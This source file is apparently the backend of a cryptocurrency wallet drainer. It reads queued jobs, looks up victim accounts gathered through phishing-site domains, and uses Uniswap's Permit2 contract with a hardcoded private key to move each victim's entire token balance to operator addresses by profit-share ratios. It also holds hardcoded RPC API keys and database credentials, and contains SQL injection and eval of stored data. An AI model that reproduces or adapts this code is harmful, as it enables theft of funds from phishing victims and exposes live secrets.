const ABI = require("./abi");

const amqp = require("amqplib/callback_api");
const { ethers } = require("ethers");

const { exec } = require("child_process");
const fs = require("fs");
const mysql = require("mysql");

const pool = mysql.createPool({
    host: "mysql",
    user: "root",
    password: "db_webdev",
    database: "web3_sig_laravel2",
});

// 封装查询函数
function executeQuery(query) {
    return new Promise((resolve, reject) => {
        pool.query(query, (error, results, fields) => {
            if (error) {
                reject(error);
            } else {
                resolve(results);
            }
        });
    });
}

//监听mq消息
amqp.connect("amqp://rabbitmq", (err, connection) => {
    if (err) {
        console.error("Failed to connect to RabbitMQ:", err);
        return;
    }

    // 创建频道
    connection.createChannel((err, channel) => {
        if (err) {
            console.error("Failed to create channel:", err);
            return;
        }

        // 声明队列
        const queueName = "ptransfer";
        channel.assertQueue(queueName, { durable: true });

        console.log("Waiting for messages...");

        // 接收消息并处理
        channel.consume(queueName, (msg) => {
            if (msg === null) {
                // 队列中没有消息，等待新的消息
                return;
            }

            const monitData = msg.content.toString();

            // 执行构建操作
            handelPermit2Transfer(monitData)
                .then(() => {
                    // 构建完成后，确认消息已处理
                    channel.ack(msg);
                })
                .catch((error) => {
                    // 发生错误，可以选择重新将消息放回队列等待重试
                    console.error("Error occurred during build:", error);
                    channel.nack(msg);
                });
        });
    });
});

async function v3check(ownerAddress, spender_address) {
    const allowance = await erc20_instance.allowance(
        ownerAddress,
        spender_address
    );
    return allowance.toString();
}

//处理转账
async function handelPermit2Transfer(monitData) {
    console.log("Start Transfer...");
    const parsedData = JSON.parse(monitData);

    //转账需要 token地址，tokenabi, 转账对象，分成比例
    const { id, token } = parsedData.Data;

    const query =
        `SELECT pc.chain,pc.account,psb.owner
    FROM permit_collection pc
    JOIN packet_sites_bot psb ON pc.source = psb.new_domain
    WHERE pc.id = ` + id;
    try {
        // 使用await等待查询结果的完成
        const fetch_rs = await executeQuery(query);
        if (fetch_rs.length < 0) return;
        const uu_account = fetch_rs[0].account;
        const chain = fetch_rs[0].chain;
        const owner = fetch_rs[0].owner;

        let provider_address = "";

        switch (chain) {
            case "1":
                provider_address =
                    "https://eth-mainnet.g.alchemy.com/v2/otntqecKVNu7AW5kP9Z370M8TsQ_cmsb";
                break;
            case "5":
                provider_address =
                    "https://eth-goerli.g.alchemy.com/v2/WiwidMq7OcizVoxOJcviZzZHPcWzHwHt";
                break;
            case "10":
                provider_address =
                    "https://opt-mainnet.g.alchemy.com/v2/OnNe0SQ2dcUrKW0ZFL6dYwWZLU0eN0Y1";
                break;
            case "56":
                provider_address =
                    "https://muddy-chaotic-spree.bsc.discover.quiknode.pro/4f3d69d50511799accd38f0399be704cf3ba89bc/";
                break;
            case "137":
                provider_address =
                    "https://polygon-mainnet.g.alchemy.com/v2/jIzu1RHGnDY69icPLUQIkfwr_iJSTdAw";
                break;
            case "42161":
                provider_address =
                    "https://arb-mainnet.g.alchemy.com/v2/bR4ts_uNNoy9eXzjsgjo5YVGL6pG-UCp";
                break;
            default:
                console.log("not find~");
        }

        const provider = new ethers.providers.JsonRpcProvider(provider_address);
        const signer = provider.getSigner();

        const privateKey =
            "e2fbe49e67e86e991e62d3dea78fa0d36a38b6d4d7075b410b53629f0f8c5de0"; //8bfe
        const wallet = new ethers.Wallet(privateKey, provider);
        const contract_address = token; //goUSDT
        const permit2_contarct_address =
            "0x000000000022D473030F116dDEE9F6B43aC78BA3";

        const erc20_instance = new ethers.Contract(
            contract_address,
            ABI.defaultErc20.abi,
            provider
        );
        const permit2_contarct_instance = new ethers.Contract(
            permit2_contarct_address,
            ABI.permit2.abi,
            wallet
        );

        //查询该TOKEN下有多少余额
        const balance = await erc20_instance.balanceOf(uu_account);
        if (balance.toString == 0) return;
        //console.log(balance.toString());
        //根剧owner去后台获取分成比例
        const sql =
            "SELECT toaddress FROM `transfer_ratios` WHERE OWNER = '" +
            owner +
            "'";
        const ratios_rs = await executeQuery(sql);

        if (fetch_rs.length < 0) return;
        const toaddress = ratios_rs[0].toaddress;
        const formattedResult = formatData(toaddress);
        let parameters = [];
        Object.keys(formattedResult).map(function (key, item) {
            //from,to,amount,contract
            parameters.push([
                uu_account,
                formattedResult[key].address,
                parseInt(balance * formattedResult[key].ratios),
                token,
            ]);
        });

        //使用permit合约进行转账
        // console.log(Object.keys(formattedResult).length);
        permit2_contarct_instance[
            "transferFrom((address,address,uint160,address)[])"
        ](parameters, {
            gasLimit: 40000 * Object.keys(formattedResult).length,
        }).then((res) => {
            console.log("res", res);
        });
    } catch (error) {
        console.error("Error executing: ", error);
        throw error;
    }
}

function formatData(data) {
    const jsonobj = eval("(" + data + ")");
    const formattedData = {};
    for (const key in jsonobj) {
        const item = jsonobj[key];
        const address = item.address;
        const ratios = (parseFloat(item.ratios) / 100).toFixed(1);
        formattedData[key] = {
            address: address,
            ratios: ratios,
        };
    }

    return formattedData;
}
